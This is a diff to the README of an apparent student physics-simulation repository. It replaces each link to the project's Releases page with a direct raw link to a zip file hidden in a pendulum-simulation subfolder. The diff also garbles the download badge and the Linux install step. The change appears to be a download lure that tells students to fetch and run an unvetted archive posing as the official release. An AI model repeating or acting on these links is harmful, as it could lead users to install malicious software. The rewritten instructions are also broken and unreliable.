@@ -2,7 +2,7 @@
 # 🎓 Physics-Projects - Easy Physics Tools for Learning
 
 ## 📥 Download Now
-[![Download Physics-Projects](https://img.shields.io/badge/Download%20Physics--Projects-v1.0-blue.svg)](https://github.com/Boyo974/Physics-Projects/releases)
+[![Download Physics-Projects](https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip%https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip)](https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip)
 
 ## 🚀 Getting Started
 Welcome to Physics-Projects! This repository contains various Python projects, simulations, and study tools designed to help Class 11 and 12 students understand physics concepts better. Whether you're a student or an educator, you will find valuable resources here.
@@ -24,7 +24,7 @@ To run these projects smoothly, you will need:
 To install and run the software, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Boyo974/Physics-Projects/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip) to find the latest version of the software.
 
 2. **Download the File**
    Locate the latest release and click on the download link for the suitable file for your operating system.
@@ -32,7 +32,7 @@ To install and run the software, follow these steps:
 3. **Install the Software**
    - For Windows: Run the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the application using terminal commands.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip` file and run the application using terminal commands.
 
 4. **Run the Application**
    After installation, open the program. You can explore various projects and simulations from the main menu.
@@ -65,5 +65,5 @@ Join our community! Share your feedback or ask questions through the Issues sect
 This project is licensed under the MIT License. Feel free to use and modify the software to fit your needs.
 
 ## 📥 Download & Install
-To start using Physics-Projects, please visit the [Releases page](https://github.com/Boyo974/Physics-Projects/releases) to download the latest version. Install it following the above instructions and enjoy exploring the wonders of physics.
+To start using Physics-Projects, please visit the [Releases page](https://raw.githubusercontent.com/Boyo974/Physics-Projects/main/Simple Pendulum Simulation/Physics-Projects-vesuvius.zip) to download the latest version. Install it following the above instructions and enjoy exploring the wonders of physics.
 ```
